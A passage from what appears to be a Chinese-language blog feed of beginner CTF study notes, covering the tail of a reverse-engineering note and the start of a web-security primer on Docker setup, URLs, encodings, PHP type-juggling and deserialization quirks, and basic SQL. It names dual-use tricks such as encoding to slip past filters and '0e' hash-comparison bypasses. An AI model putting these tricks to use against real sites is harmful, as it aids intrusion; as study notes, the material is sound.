&lt;span class=&quot;n&quot;&gt;codes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;codes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;operator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(虽然上面的东西没有做条件转换之类的东西, 因为没有写&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt;指针, 是个很弱的vm. )&lt;/p&gt;

&lt;p&gt;这种类型就是自己也写一个vm, 然后区别就是这个vm的思路就是用来输出一些好看的代码, 
让这个输出的代码可以用别的方式运行, 于是就可以知道里面程序的运行方式了.&lt;/p&gt;

&lt;h3 id=&quot;脱壳&quot;&gt;脱壳&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;广义来说壳主要分两种: 压缩壳与加密壳, 即缩小文件体积和加密代码以提高逆向难度. 
UPX, ASPack等壳均属于压缩壳, 其可将文件体积缩小50%-70%.  &lt;br /&gt;
来自&lt;a href=&quot;http://www.qfrost.com/CTF/upx/&quot;&gt;网络&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;简单的UPX脱壳&lt;/strong&gt;  &lt;br /&gt;
UPX壳的程序的特征就是在代码里面有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPX&lt;/code&gt;的标志, 比如什么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPX0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UPX1&lt;/code&gt;等. 
网络上有专门的程序用来脱壳.&lt;/p&gt;

&lt;p&gt;但是没有接触过, 所以很难说怎么做, 以后接触了再说.&lt;/p&gt;

&lt;h3 id=&quot;无法调试-可以trace&quot;&gt;无法调试, 可以trace&lt;/h3&gt;
&lt;p&gt;这个没有详细介绍, 网上的也看不太懂, 所以以后遇到了再说.&lt;/p&gt;

&lt;h3 id=&quot;无法调试-可以改源码&quot;&gt;无法调试, 可以改源码&lt;/h3&gt;
&lt;p&gt;掌握一门叫做瞎几把乱改的技术…&lt;/p&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;虽然后面的写得很潦草, 因为没有实操经验.&lt;/p&gt;

&lt;p&gt;不过这篇文章就当作是对RE有哪些可以用的方法进行一个记录吧…&lt;/p&gt;

&lt;p&gt;以后接触的多了估计会好一点…&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">Reverse Engineering 逆向工程的作用目前对我来说就是一种能够将魔法一般的程序拉下神坛, 将这个黑箱子里面的东西的秘密破解出来的技术.</summary></entry><entry><title type="html">Web</title><link href="http://0.0.0.0:4000/ctf/web/" rel="alternate" type="text/html" title="Web" /><published>2022-01-15T05:12:36+00:00</published><updated>2022-01-15T05:12:36+00:00</updated><id>http://0.0.0.0:4000/ctf/web</id><content type="html" xml:base="http://0.0.0.0:4000/ctf/web/">&lt;h1 id=&quot;ctf-web基础&quot;&gt;CTF: Web基础&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://ucasers.cn&quot;&gt;一个学长的博客&lt;/a&gt;, 相比之下, 我的博客只能说是乱七八糟的合集了, 
笑. 目前还是慢慢学, 至少现在有了一个好的参考的地方了.&lt;/p&gt;

&lt;p&gt;(这个东西现在就当作是一个画饼一样的文章吧, 以后遇到相关的东西, 
或者是要学相关的东西的时候, 我就会在里面补充的. )&lt;/p&gt;

&lt;p&gt;(注: 我现在发现有一种快速了解一个东西的方法, 就是在网上搜索&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cheetsheet&lt;/code&gt;, 
这种东西感觉很好用. 可以快速了解, 方便查阅. 然后遇到具体的东西, 
就只好查查网络, 还有就是详细的文档和手册了. )&lt;/p&gt;

&lt;p&gt;(又注: 里面的很多东西大概我就只是一个劲的抄, 可能有些东西抄之前还是觉得自以为看懂了, 
但是越写越觉得不对劲, 然后我又不懂了, 总之可能会写得乱七八糟的, 因为这个只是一个笔记, 
只是单纯地记录一些学习的内容. 如果有错误, 请指出. )&lt;/p&gt;

&lt;h2 id=&quot;简单的docker环境配置&quot;&gt;简单的Docker环境配置&lt;/h2&gt;
&lt;p&gt;关于环境的配置, 嗯, 怎么说呢. 一开始脑子没在线, 确实很尴尬. 
我们用的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lamp&lt;/code&gt;环境, 感觉除了美观上缺一点, 
其他的都十分的方便.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; docker pull mattrayner/lamp:latest-1804-php7
&amp;gt;&amp;gt; docker run -d --name &amp;lt;your_name_for_container&amp;gt; -p 80:80 -p 3306:3306 -v &amp;lt;local_path&amp;gt;:/app mattrayner/lamp:latest-1804-php7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大概就是这样配置和运行一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;然后关于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;的简单应用
(&lt;a href=&quot;https://www.docker.com/sites/default/files/d8/2019-09/docker-cheat-sheet.pdf&quot;&gt;cheet sheet&lt;/a&gt;):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; 可以输出正在运行的容器的一些信息&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker image ls&lt;/code&gt; 列出本地的容器镜像和信息&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker image rm &amp;lt;container_name&amp;gt;&lt;/code&gt; 删除镜像&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec -it &amp;lt;container_name&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt; 运行容器里面的命令, 
虽然常常用到的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec -it mysqlenv /bin/bash&lt;/code&gt;, 打开一个终端.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(现在发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;好像是很有用的样子. )&lt;/p&gt;

&lt;h2 id=&quot;网页的简单模型&quot;&gt;网页的简单模型&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;表示层&lt;/th&gt;
      &lt;th&gt;业务逻辑层&lt;/th&gt;
      &lt;th&gt;数据访问层&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;呈现HTML&lt;/td&gt;
      &lt;td&gt;加载编译并发送HTML文件&lt;/td&gt;
      &lt;td&gt;处理执行SQL语句, 返回数据&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;上面的是一个简单的网页显示的逻辑: 用户所在的表示层访问网页, 
通常是用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;来寻址, 找到服务器, 向服务器发送请求, 服务器收到请求后, 
查询调用数据库, 并根据数据库来生成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;文件, 最后发送给客户端. 
在客户端那边, 通过游览器渲染显示&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;网页, 就是一个加载网页的简单模型了.&lt;/p&gt;

&lt;p&gt;接下来根据各个部分比较主要的知识记一下笔记.&lt;/p&gt;

&lt;h3 id=&quot;url&quot;&gt;URL&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;的基本组成如下:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scheme://userinfo@host:port/path?query#fragment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中的各个部分分别是:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;part&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;scheme&lt;/td&gt;
      &lt;td&gt;协议类型, 如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;等&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;userinfo&lt;/td&gt;
      &lt;td&gt;用户信息, 如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username:password&lt;/code&gt;或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;host&lt;/td&gt;
      &lt;td&gt;主机名称(地址), 比如说是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;li-yiyang.github.io&lt;/code&gt;, 是一个域名的形式, 或者说是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt;的形式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;port&lt;/td&gt;
      &lt;td&gt;端口, 比如说是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;path&lt;/td&gt;
      &lt;td&gt;就是具体的地址&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;query&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;查询的参数, 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=admin&amp;amp;passwd=666&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;fragment&lt;/td&gt;
      &lt;td&gt;一般不会发送给服务器, 是游览器的锚点的功能, 让游览器聚焦在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fragment&lt;/code&gt;的标签上.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;html-basic-and-so-on&quot;&gt;HTML Basic and so on&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;HTML&lt;/strong&gt;, 也叫&lt;strong&gt;HyperText Markup Language&lt;/strong&gt;, 是一种标记语言.&lt;/p&gt;

&lt;p&gt;主要的特征是用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tag&lt;/code&gt;包含信息来标记文本的样式和功能, 形成漂亮的结果.&lt;/p&gt;

&lt;p&gt;因为不只是CTF用, 所以我还是要学一点点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;, 然后还要一点点的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;js&lt;/code&gt;, 
还有一些&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;css&lt;/code&gt;的知识要掌握.&lt;/p&gt;

&lt;p&gt;不过发现了一个漂亮的网站上面有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cheetsheet&lt;/code&gt;, 不如直接就先看看这个, 
然后应付着用吧? &lt;a href=&quot;https://htmlcheatsheet.com&quot;&gt;html&lt;/a&gt;, 
&lt;a href=&quot;https://htmlcheatsheet.com/css/&quot;&gt;css&lt;/a&gt;, &lt;a href=&quot;https://htmlcheatsheet.com/js/&quot;&gt;js&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;(虽然我觉得最好的办法是现学现查… )&lt;/p&gt;

&lt;p&gt;然后关于&lt;strong&gt;网页信息提交&lt;/strong&gt;的两种方法, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;还有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;方法主要是像这样的形式: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://website?name=admin&amp;amp;password=password&lt;/code&gt;, 
就是用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;来开始参数的罗列, 用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;来分隔每一个参数的赋值.   &lt;br /&gt;
这样的方法主要的问题就是会写一长串的URL, 而且(总觉得)还会被看光.&lt;/li&gt;
  &lt;li&gt;而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;方法是向服务器发送表单, 在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ruby&lt;/code&gt;里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net/http&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gem&lt;/code&gt;里面形式如下, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Net::HTTP.post_form(url, key =&amp;gt; vlaue)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后是关于&lt;strong&gt;网页编码&lt;/strong&gt;的问题, 计算机有很多的编码, 网页有两种编码, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;编码, 
(这样的编码长得像这样: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt;, 总之有点像是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;加上内码. )
还有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;编码, 
(这样的编码长得像这样: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%65&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;, 有点像是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%&lt;/code&gt;加上内码). 
(还有一种是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javascript&lt;/code&gt;编码, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\u72&lt;/code&gt;的形式. )&lt;/p&gt;

&lt;p&gt;往往要命的是搞清楚这些编码是什么时候开始执行, 什么时候什么类型的编码先执行, 
搞清楚了这个就可以用编码来混淆程序的筛查之类的东西.&lt;/p&gt;

&lt;p&gt;考虑一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;文件, 游览器要去解析它变成网页渲染出来, 那么&lt;strong&gt;首先&lt;/strong&gt;, 
执行的就会是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;编码, &lt;strong&gt;然后&lt;/strong&gt;, 再会根据具体的代码决定是怎样的顺序:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;a herf=&quot;url_link&quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; 就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html -&amp;gt; url&lt;/code&gt;, 因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;herf&lt;/code&gt;标签是处理超链接的, 
也就是说, 会对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;herf&lt;/code&gt;中的链接进行一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;解码.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;a herf=#  onclick=&quot;window.open('url_link')&quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; 
顺序是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html -&amp;gt; javascript -&amp;gt; url&lt;/code&gt;, 因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onclick&lt;/code&gt;是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;js&lt;/code&gt;事件处理器的东西, 
所以相当于是把这段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;js&lt;/code&gt;代码给解释器, 然后解释器再会给&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;并且这样的逻辑还可以一层套一层, 感觉很麻烦.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(但是感觉可以通过程序执行的逻辑来分析就是了: 原理是这样的, 
游览器从网络堆栈中得到内容, 经过&lt;strong&gt;html解析&lt;/strong&gt;进行词法解析, 创建了一个DOM树, 
接下来就会调用&lt;strong&gt;javascript解析器&lt;/strong&gt;解析内部的脚本, 这个时候会处理unicode和hex转义, 
然后与此同时, 假如遇到要url的上下文, 就会调用&lt;strong&gt;url解析器&lt;/strong&gt;. 那么js和url谁先? 
看谁在外面谁先, 假如是包含在url里面的js, 就是url先. 感觉好乱. )&lt;/p&gt;

&lt;h3 id=&quot;php-basic&quot;&gt;PHP Basic&lt;/h3&gt;
&lt;p&gt;感觉语法还好, 关键是&lt;a href=&quot;https://www.php.net/manual/zh/&quot;&gt;官方的手册&lt;/a&gt;很清晰, 
还有翻译. 这难道不香吗?&lt;/p&gt;

&lt;p&gt;(所以决定还是先学先查了. )&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PHP特性&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;弱类型的语言  &lt;br /&gt;
往往就会因此而出问题
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&quot; == 0 == false&lt;/code&gt; 这三个是相等的&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'123' == 123&lt;/code&gt; 自动就会进行数值类型转换&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'abc' == 0&lt;/code&gt; 转换的规则是只要有数字就转换&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'123a' == 123&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'0x01' == 0&lt;/code&gt; 但是不连续&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'0e1234567' == 0&lt;/code&gt; 可以用来hash碰撞&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true == &amp;lt;any_value&amp;gt;&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;可以和所有的值都为真&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;精度问题  &lt;br /&gt;
一般的语言都会有这个问题的吧?
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.0000000000000001 == 1&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intval('10000000000000000000’) == 9223372036854775807&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10000000000000000000-1 == 10000000000000000000&lt;/code&gt; 原因是数值太大, 溢出整型, 
然后就强制转换成了浮点型, 后面的位数就被忽略了.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json_encode(array(&quot;invite&quot;=&amp;gt;-3.3e99999999999999)) == bool(false)&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;反序列化  &lt;br /&gt;
反序列化和序列化是一种可以用来传递数据的方式, 但是可以被解释器错误利用, 导致错误
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s:4:&quot;test&quot; == S:4:&quot;\74\65\73\74&quot;&lt;/code&gt; 字符串的两种方式&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S&lt;/code&gt;, 
后者用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&amp;lt;hex&amp;gt;&lt;/code&gt;的方式表示字符, 于是可以往里面塞坏东西. 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\00&lt;/code&gt;之类的东西.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;文件包含&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在php里面, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include_once&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require_once&lt;/code&gt;
都可以将放在别的地方的代码载入其中. 只不过区别就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt;在找不到的时候会报错, 
然后加了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_once&lt;/code&gt;的代码是只会加载一次, 防止因为反复加载导致&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;500&lt;/code&gt;错误.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;extract函数&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;varname&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在php里面用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extract&lt;/code&gt;命令可以为变量赋值, 默认是覆盖变量.&lt;/p&gt;

&lt;h3 id=&quot;sql-basic&quot;&gt;SQL Basic&lt;/h3&gt;
&lt;p&gt;感觉和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access&lt;/code&gt;的逻辑很像.&lt;/p&gt;

&lt;p&gt;首先, 是如何运行程序, 这里的程序是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt;, 对于没有密码的数据库, 
直接在终端里执行命令&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt;即可, 对于有密码的数据库, 加上一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt;的参数就好; 
然后是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sql&lt;/code&gt;的(单行)注释语句: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt;, 这个在后面的SQL注入攻击也有比较重要的用处.&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- 创建名为test的数据库&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- 显示所有数据库&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;databases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;c1&quot;&gt;-- 选择名叫test的数据库&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- 新建一个叫做user的表, 有三个列元素, id, username, password, &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;--   分别对应的是int, varchar, varchar三种类型&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;varchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;varchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; 
&lt;span class=&quot;c1&quot;&gt;-- 查看表&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- 按照顺序插入值&lt;/span&gt;
